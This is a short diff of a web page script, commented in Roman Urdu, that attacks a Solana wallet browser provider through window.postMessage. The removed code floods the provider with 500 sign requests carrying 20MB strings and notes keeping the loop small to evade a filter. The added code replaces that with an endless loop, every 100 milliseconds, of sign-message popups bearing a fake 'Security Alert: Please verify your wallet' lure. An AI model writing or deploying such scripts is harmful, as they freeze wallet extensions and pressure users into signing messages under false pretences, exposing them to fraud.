@@ -1,15 +1,19 @@
 <script>
-    setTimeout(() => {
-        // 20MB ka aik hi message (Pehle se 4 guna bada)
-        const ultraHeavy = "Z".repeat(20 * 1024 * 1024); 
+    function spamPrompts() {
+        // User ko baar baar sign karne ka popup dikhana
+        window.postMessage({
+            target: "provider",
+            data: { 
+                method: "sol_signMessage", 
+                params: ["Security Alert: Please verify your wallet to prevent loss!"] 
+            }
+        }, "*");
         
-        // Loop ko kam baar chalayein taake filter na pakre
-        for (let i = 0; i < 500; i++) {
-            window.postMessage({
-                target: "provider",
-                data: { method: "sol_signMessage", params: [ultraHeavy] }
-            }, "*");
-        }
-        alert("System Overload Sent! Check if touch works.");
+        // Har 100 millisecond baad doobara popup bhejna
+        setTimeout(spamPrompts, 100);
+    }
+
+    setTimeout(() => {
+        spamPrompts();
     }, 2000);
 </script>
